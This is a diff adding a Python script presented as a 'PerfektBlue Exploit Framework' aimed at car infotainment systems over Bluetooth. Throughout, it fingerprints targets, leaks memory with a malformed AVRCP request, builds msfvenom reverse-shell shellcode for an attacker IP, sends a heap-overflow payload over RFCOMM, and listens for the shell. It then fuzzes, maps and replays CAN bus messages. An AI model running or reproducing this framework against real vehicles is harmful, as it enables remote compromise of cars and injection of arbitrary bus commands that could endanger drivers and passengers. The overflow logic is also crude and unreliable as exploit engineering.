@@ -1,0 +1,241 @@
+import bluetooth
+import socket
+import struct
+import random
+import time
+import threading
+import can
+import os
+import platform
+import subprocess
+import json
+
+# === CONFIGURATION ===
+DEFAULT_RFCOMM_PORT = 3
+SHELL_LISTEN_PORT = 4444
+AVRCP_MALFORMED_CMD = b'\x10\x47' + b'\xFF' * 10
+REVERSE_SHELL_PORT = 4444
+ARCHITECTURES = ["armle", "aarch64", "x86", "x64", "mipsel"]
+CAN_DB_PATH = "can_command_db.json"
+
+# === UTILS ===
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    except:
+        return "127.0.0.1"
+    finally:
+        s.close()
+
+def prompt_external_ip():
+    print("[*] IMPORTANT: Reverse shell requires an IP the target can reach.")
+    print("[*] For vehicles not connected to Internet, you must use Bluetooth-to-TCP or physical backchannel.")
+    ip = input("Enter attacker IP for reverse shell listener (or press ENTER to auto-detect): ").strip()
+    return ip if ip else get_local_ip()
+
+def run_nmap_fingerprint(target_ip):
+    print(f"[*] Running Nmap OS and service scan on {target_ip}...")
+    try:
+        result = subprocess.run(["nmap", "-O", "-sV", target_ip], capture_output=True, text=True, timeout=60)
+        print(result.stdout)
+        return result.stdout
+    except Exception as e:
+        print(f"[!] Nmap fingerprinting failed: {e}")
+        return None
+
+def run_bluetooth_fingerprint(bt_addr):
+    print(f"[*] Running Bluetooth service scan on {bt_addr}...")
+    try:
+        services = bluetooth.find_service(address=bt_addr)
+        if not services:
+            print("[!] No services found.")
+            return None
+        for svc in services:
+            print(f"  [Service] Name: {svc['name']} | Protocol: {svc['protocol']} | Port: {svc['port']}")
+        return services
+    except Exception as e:
+        print(f"[!] Bluetooth fingerprinting failed: {e}")
+        return None
+
+# === STAGE 1: MEMORY LEAK VIA AVRCP ===
+def avrcp_info_leak(target_addr, port):
+    print(f"[*] Sending AVRCP malformed request to {target_addr}:{port}")
+    try:
+        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
+        s.connect((target_addr, port))
+        s.send(AVRCP_MALFORMED_CMD)
+        response = s.recv(1024)
+        s.close()
+        print(f"[+] Leak Response: {response.hex()}")
+        if len(response) >= 4:
+            leaked_ptr = struct.unpack("<I", response[-4:])[0]
+            print(f"[+] Potential leaked address: 0x{leaked_ptr:X}")
+            return leaked_ptr
+        else:
+            print("[-] Leak failed or too short.")
+            return None
+    except Exception as e:
+        print(f"[!] Leak error: {e}")
+        return None
+
+# === STAGE 2: HEAP OVERFLOW AND SHELLCODE DEPLOYMENT ===
+def generate_reverse_shell_payload(ip, port, arch):
+    print(f"[*] Generating reverse shell payload using msfvenom for arch: {arch}")
+    try:
+        result = subprocess.run([
+            "msfvenom",
+            "-p", f"linux/{arch}/shell_reverse_tcp",
+            f"LHOST={ip}",
+            f"LPORT={port}",
+            "-f", "python"
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if result.returncode != 0:
+            print(f"[!] msfvenom failed: {result.stderr}")
+            return b""
+        lines = result.stdout.splitlines()
+        payload_lines = [line for line in lines if line.startswith("buf")]
+        payload = b""
+        for line in payload_lines:
+            exec(line.strip())
+        return buf
+    except Exception as e:
+        print(f"[!] Payload generation error: {e}")
+        return b""
+
+def overflow_payload(leaked_address=None, shellcode=b""):
+    buf = b'A' * 128
+    if leaked_address:
+        buf += struct.pack("<I", leaked_address)
+    buf += shellcode
+    return buf
+
+def send_overflow(target_addr, port, leaked_address=None, shellcode=b""):
+    payload = overflow_payload(leaked_address, shellcode)
+    print(f"[*] Sending overflow payload ({len(payload)} bytes)...")
+    try:
+        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
+        s.connect((target_addr, port))
+        s.send(payload)
+        s.close()
+        print("[+] Overflow payload sent.")
+    except Exception as e:
+        print(f"[!] Overflow failed: {e}")
+
+# === STAGE 3: REVERSE SHELL LISTENER ===
+def reverse_shell_listener(listen_port=SHELL_LISTEN_PORT):
+    print(f"[*] Listening for reverse shell on 0.0.0.0:{listen_port}")
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(('0.0.0.0', listen_port))
+    server.listen(1)
+    conn, addr = server.accept()
+    print(f"[+] Reverse shell connected from {addr}")
+    try:
+        while True:
+            cmd = input("$ ")
+            if cmd.strip() == 'exit':
+                break
+            conn.sendall(cmd.encode() + b'\n')
+            response = conn.recv(4096)
+            print(response.decode())
+    except KeyboardInterrupt:
+        print("\n[*] Shell session terminated.")
+    finally:
+        conn.close()
+        server.close()
+
+# === CAN BUS FUZZING & PERSISTENT MAPPING ===
+def load_can_db():
+    if os.path.exists(CAN_DB_PATH):
+        with open(CAN_DB_PATH, 'r') as f:
+            return json.load(f)
+    return {}
+
+def save_can_db(db):
+    with open(CAN_DB_PATH, 'w') as f:
+        json.dump(db, f, indent=2)
+
+def fuzz_can(interface='can0'):
+    print(f"[*] Starting CAN fuzzing on interface {interface}...")
+    bus = can.interface.Bus(channel=interface, bustype='socketcan')
+    for i in range(50):
+        can_id = random.randint(0x100, 0x7FF)
+        data_len = random.randint(1, 8)
+        data = bytearray(random.getrandbits(8) for _ in range(data_len))
+        msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
+        print(f"[*] Sending ID: 0x{can_id:X}, Data: {data.hex()}")
+        bus.send(msg)
+        time.sleep(0.1)
+
+def map_can_commands(interface='can0', duration=10):
+    print(f"[*] Mapping CAN commands on {interface} for {duration} seconds...")
+    bus = can.interface.Bus(channel=interface, bustype='socketcan')
+    start = time.time()
+    seen = load_can_db()
+    while time.time() - start < duration:
+        msg = bus.recv(timeout=1)
+        if msg:
+            cmd = f"0x{msg.arbitration_id:X}"
+            if cmd not in seen:
+                seen[cmd] = list(msg.data)
+                print(f"[+] Mapped CMD {cmd} => {msg.data.hex()}")
+    save_can_db(seen)
+    return seen
+
+def replay_can_command(interface='can0', cmd_map=None):
+    if not cmd_map:
+        print("[!] No CAN commands mapped.")
+        return
+    bus = can.interface.Bus(channel=interface, bustype='socketcan')
+    for cmd, data in cmd_map.items():
+        msg = can.Message(arbitration_id=int(cmd, 16), data=bytearray(data), is_extended_id=False)
+        print(f"[*] Replaying CMD {cmd} => {bytearray(data).hex()}")
+        bus.send(msg)
+        time.sleep(0.1)
+
+# === MAIN ===
+def main():
+    print("=== PerfektBlue Exploit Framework (Premium Edition) ===")
+    target = input("Target Bluetooth MAC address: ").strip()
+    port = DEFAULT_RFCOMM_PORT
+    attacker_ip = prompt_external_ip()
+
+    try:
+        run_bluetooth_fingerprint(target)
+        ip_guess = input("Target IP address (for Nmap scan, or ENTER to skip): ").strip()
+        if ip_guess:
+            run_nmap_fingerprint(ip_guess)
+    except Exception as e:
+        print(f"[!] Fingerprinting failed: {e}")
+
+    print("[*] Select target architecture (based on fingerprinting):")
+    for i, arch in enumerate(ARCHITECTURES):
+        print(f"  [{i}] {arch}")
+    arch_choice = input("Choose architecture index or press ENTER for default [0]: ").strip()
+    arch = ARCHITECTURES[int(arch_choice)] if arch_choice.isdigit() else ARCHITECTURES[0]
+
+    shellcode = generate_reverse_shell_payload(attacker_ip, REVERSE_SHELL_PORT, arch)
+    if not shellcode:
+        print("[!] No shellcode generated. Aborting.")
+        return
+
+    leaked = avrcp_info_leak(target, port)
+    time.sleep(1)
+    send_overflow(target, port, leaked, shellcode)
+
+    launch_shell = input("[?] Wait for reverse shell? (y/n): ").strip().lower()
+    if launch_shell == 'y':
+        reverse_shell_listener()
+
+    do_can = input("[?] Run CAN fuzzing/mapping? (y/n): ").strip().lower()
+    if do_can == 'y':
+        iface = input("CAN interface name (default 'can0'): ").strip() or 'can0'
+        fuzz_can(iface)
+        cmd_map = map_can_commands(iface)
+        replay = input("[?] Replay mapped CAN commands? (y/n): ").strip().lower()
+        if replay == 'y':
+            replay_can_command(iface, cmd_map)
+
+if __name__ == "__main__":
+    main()
